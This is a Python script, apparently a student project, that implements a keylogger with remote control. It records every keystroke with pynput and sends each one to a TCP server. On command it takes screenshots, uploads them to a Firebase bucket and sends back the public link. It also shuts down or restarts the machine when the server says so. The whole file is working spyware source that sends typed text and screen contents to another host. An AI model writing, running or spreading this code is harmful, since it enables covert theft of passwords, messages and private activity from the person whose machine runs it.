from pynput.keyboard import Listener
import socket
import pyautogui
from datetime import datetime
import os
import firebase_admin
from firebase_admin import credentials, storage
cred = credentials.Certificate("credentials.json")
firebase_admin.initialize_app(cred, {"storageBucket": "pbl4-09092003.appspot.com"})


clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

serverParent = '192.168.1.10'
serverPort = 8080
try:
    clientSocket.connect((serverParent, serverPort))
except Exception as e:
    print("Error connecting to server:", str(e))
if clientSocket:
    print("connecting to server")

def on_press(key):
    try:
        key = str(key)
        key = key.replace("'", "")
        if key == "Key.f12":
            raise SystemExit(0)
        clientSocket.sendall(key.encode('utf-8'))
    except Exception as e:
        print("Error: " + str(e))

def takeScreenshot():
    now = datetime.now()
    nameScreen = "screenshot-" + now.strftime("%Y%m%d-%H%M%S") + ".png"
    print("Name Screen: ", nameScreen)
    try:
        screenshot = pyautogui.screenshot()
        if screenshot:
            print("successfully taken screenshot")
        else:
            print("Failed to take screenshot")
        screenshot.save(nameScreen)
        
        # Lưu ảnh vào Firebase Storage
        bucket = storage.bucket()
        blob = bucket.blob(nameScreen)
        blob.upload_from_filename(nameScreen)
        
        # Gửi link ảnh public  đến server
        link = blob.public_url
        print("Link: ",  link)
        clientSocket.send(link.encode('utf-8'))
        
        # # Generate a download URL
        # download_url = blob.generate_signed_url(expiration=300)  # Adjust expiration time as needed
        # print("Download URL: ", download_url)
        # clientSocket.send(download_url.encode('utf-8'))

    except Exception as e:
        print("Error: " + str(e))

    
with Listener(on_press=on_press) as parent:
    try:
        while True:
            message = clientSocket.recv(1024).decode('utf-8')
            print("Message:" + message)
            if message == 'takeScreenshot':
                takeScreenshot()
            elif message == 'shutdown':
                os.system("shutdown /s /t 1")
            elif message == 'restart':
                os.system("shutdown /r /t 1")
    except Exception as e:
        print("Error: " + str(e))
    finally:
        parent.stop()
        parent.join()
        